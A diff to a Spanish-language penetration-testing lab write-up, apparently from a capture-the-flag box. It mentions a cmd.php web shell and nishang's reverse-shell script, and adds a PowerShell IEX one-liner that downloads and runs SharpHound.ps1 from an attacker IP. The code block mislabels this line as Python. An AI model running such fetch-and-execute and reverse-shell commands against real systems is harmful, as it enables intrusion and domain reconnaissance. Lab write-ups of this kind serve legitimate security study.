@@ -311,5 +311,12 @@ al subir el archivo solo debemos ir a la url y llamar al comando `cmd.php=` y po
 vamos a utilizar el repositorio de [nishang](https://github.com/samratashok/nishang.git) en este caso para lograr obtener una reverse shell usaremos el `Invoke-PowerShellTcp.ps1` y agregamos una pequeña linea al final para matar dos pájaros de un solo tiro
 ![[Pasted image 20240724154346.png]]
 
-`cargamos el `
+`WebClient`
+llamamos el archivo desde la web con el siguiente comando
+
+```python
+IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.64/SharpHound.ps1')
+```
+
 ![[Pasted image 20240724154838.png]]
+
